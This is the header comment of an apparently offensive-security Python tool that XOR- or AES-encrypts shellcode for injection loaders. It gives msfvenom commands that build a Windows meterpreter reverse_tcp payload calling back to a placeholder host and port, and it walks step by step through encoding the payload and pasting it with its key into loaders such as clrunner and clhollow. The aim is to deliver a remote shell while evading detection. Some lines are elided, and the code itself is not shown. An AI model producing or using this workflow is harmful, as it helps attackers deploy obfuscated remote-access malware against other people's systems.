#!/usr/bin/env python3
# ================================================================
# shellcode_encoder.py — XOR and AES Shellcode Encoder
# ================================================================
# WHAT THIS DOES:
...
#   pyscrypt (scrypt KDF with salt "saltmegood"). The IV is random
...
#   (If pyscrypt won't install: pip3 install pyscrypt --no-build-isolation)
#
# USAGE:
#   python3 shellcode_encoder.py <shellcode_file> <key> <xor|aes> [output_flags]
#
#   Arguments:
...
#
#   AES encrypt, output C#:
#     python3 shellcode_encoder.py shell.bin mypassword aes -cs
#
#   AES encrypt, output all formats:
#     python3 shellcode_encoder.py shell.bin mypassword aes -cs -cpp -py
#
#   XOR encode, output base64 (for embedding in scripts):
#     python3 shellcode_encoder.py shell.bin mykey xor -b64
#
# OUTPUT:
#   Files are created in ./result/ directory (created automatically):
#     ./result/encryptedShellcodeWrapper_xor.cs   (XOR output)
#     ./result/encryptedShellcodeWrapper_aes.cs   (AES output)
#   Open the file, copy the byte array, paste into your loader's buf[].
#
# FULL WORKFLOW:
#   1. Generate shellcode with placeholder IPs (for clrunner/clinject/clhollow):
#        msfvenom -p windows/x64/meterpreter/reverse_tcp \
#          LHOST=11.11.11.11 LPORT=8738 EXITFUNC=thread -f raw -o shell.bin
#      OR for sections-runner (real IP since it's XOR only, no runtime patching):
#        msfvenom -p windows/x64/meterpreter/reverse_tcp \
...
#        python3 shellcode_encoder.py shell.bin mypassword aes -cs
#
#   3. Open result/encryptedShellcodeWrapper_aes.cs
#      Copy the byte array (everything inside new byte[] { ... })
#
#   4. Paste into your loader's buf[] variable
#      Update the array size: new byte[XXXX] where XXXX = byte count
#
#   5. If using AES: record the key/IV shown in the output, paste into
#      MyKey and Myiv in your loader. OR use your own key/IV generation
#      (see clrunner.cs header for instructions).
#
# NOTES:
#   - The AES key is DERIVED from your password string via scrypt.
#     The derived key/IV are shown in the output — use those exact values
#     in your loader, NOT the raw password.
#   - This script must be run from the 04-encoders/aes/ directory (or
#     wherever the ./templates/ folder is) so it can find the templates.
#   - Run with: cd /path/to/04-encoders/aes/ && python3 shellcode_encoder.py ...
# ================================================================
#!/usr/bin/python
# -*- coding: utf8 -*-
#
